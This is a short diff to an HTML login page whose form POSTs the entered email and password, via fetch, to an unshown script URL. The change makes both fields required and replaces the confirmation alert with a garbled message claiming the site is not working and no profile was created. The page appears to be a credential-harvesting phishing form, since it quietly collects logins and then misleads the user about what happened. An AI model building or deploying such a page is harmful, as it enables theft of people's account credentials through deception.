@@ -17,10 +17,10 @@
             <span> Please LogIn to your account</span>
         </h3>
         <label for="email">Email</label>
-        <input type="email" placeholder="Enter email" id="email" name="Email">
+        <input type="email" placeholder="Enter email" id="email" name="Email" required>
 
         <label for="password">Password</label>
-        <input type="password" placeholder="Enter password" id="password" name="Password">
+        <input type="password" placeholder="Enter password" id="password" name="Password" required>
 
         <button>Login</button>
     </form>
@@ -31,7 +31,7 @@
         form.addEventListener('submit', e => {
           e.preventDefault()
           fetch(scriptURL, { method: 'POST', body: new FormData(form)})
-            .then(response => alert("Thanks for Contacting us..! We Will Contact You Soon..."))
+            .then(response => alert("Welcome back but isn't working properly so your profile is not be created on this site or your data sote in our database"))
             .catch(error => console.error('Error!', error.message))
         })
 </script>    
